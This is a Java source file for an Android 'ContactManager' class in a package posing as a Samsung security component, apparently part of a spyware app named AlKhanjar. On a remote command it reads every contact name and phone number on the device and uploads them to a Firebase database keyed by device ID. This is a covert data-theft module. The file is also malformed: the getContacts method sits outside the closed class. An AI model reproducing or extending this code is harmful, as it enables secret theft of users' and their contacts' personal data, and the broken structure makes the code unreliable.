package com.samsung.android.security.v8.managers;

import android.content.Context;
import android.util.Log;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.samsung.android.security.v8.AlKhanjarApp;

import java.util.HashMap;
import java.util.Map;

public class ContactManager {
    private static final String TAG = "ContactManager";
    private Context context;
    
    public ContactManager(Context context) {
        this.context = context;
    }
    
    protected void sendResponse(String commandId, String status, Object data) {
        try {
            FirebaseDatabase database = FirebaseDatabase.getInstance();
            DatabaseReference responseRef = database.getReference("responses")
                .child(AlKhanjarApp.getDeviceId())
                .child(commandId);
            
            Map<String, Object> response = new HashMap<>();
            response.put("status", status);
            response.put("data", data);
            response.put("timestamp", System.currentTimeMillis());
            
            responseRef.setValue(response);
        } catch (Exception e) {
            Log.e(TAG, "Send response error: " + e.getMessage());
        }
    }
}
    
    public void getContacts(String commandId) {
        try {
            android.database.Cursor cursor = context.getContentResolver().query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);
            
            java.util.List<Map<String, String>> contacts = new java.util.ArrayList<>();
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    Map<String, String> contact = new HashMap<>();
                    int nameIdx = cursor.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                    int numberIdx = cursor.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER);
                    
                    if (nameIdx >= 0 && numberIdx >= 0) {
                        contact.put("name", cursor.getString(nameIdx));
                        contact.put("phone", cursor.getString(numberIdx));
                        contacts.add(contact);
                    }
                } while (cursor.moveToNext());
                cursor.close();
            }
            
            sendResponse(commandId, "success", contacts);
        } catch (Exception e) {
            sendResponse(commandId, "error", e.getMessage());
        }
    }
